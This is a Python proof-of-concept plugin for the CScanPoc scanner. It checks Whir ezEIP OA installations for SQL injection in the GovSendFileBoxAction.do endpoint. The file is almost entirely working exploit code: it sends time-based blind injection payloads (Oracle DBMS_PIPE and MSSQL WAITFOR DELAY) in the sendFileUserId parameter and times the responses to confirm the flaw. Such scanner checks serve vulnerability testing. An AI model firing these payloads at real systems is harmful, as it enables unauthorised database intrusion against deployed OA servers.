# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Whir_0000'  # 平台漏洞编号，留空
    name = '万户ezEIP前台 GovSendFileBoxAction.do无条件注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-24'  # 漏洞公布时间
    desc = '''
        万户ezEIP前台 /defaultroot/GovSendFileBoxAction.do 无条件注入。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=077217
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '万户OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9a8017cb-a586-4bc7-8005-ee29491c7b80'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/defaultroot/GovSendFileBoxAction.do?editId=2&sendFileUserId=1&action=delBatch"
            target = arg+payload
            fst_sta = time.time()
            code, head, res, errcode, _ = hh.http(target)
            fst_end = time.time()

            # 乌云上的注入是mssql的，而我找到是oracle,就都写了。
            payloads = ["/defaultroot/GovSendFileBoxAction.do?editId=2&sendFileUserId=1)%20AND%205943=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(106)||CHR(111)||CHR(73),5)%20AND%20(9258=9258&action=delBatch",
                        "/defaultroot/GovSendFileBoxAction.do?editId=2&sendFileUserId=1)%20waitfor%20delay%20'0:0:5'--&action=delBatch"
                        ]
            for payload in payloads:
                target = arg+payload
                sec_sta = time.time()
                code, head, res, errcode, _ = hh.http(target)
                sec_end = time.time()

                fst = fst_end-fst_sta
                sec = sec_end-sec_sta

                if code == 500 and fst < 2 and sec > 5:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
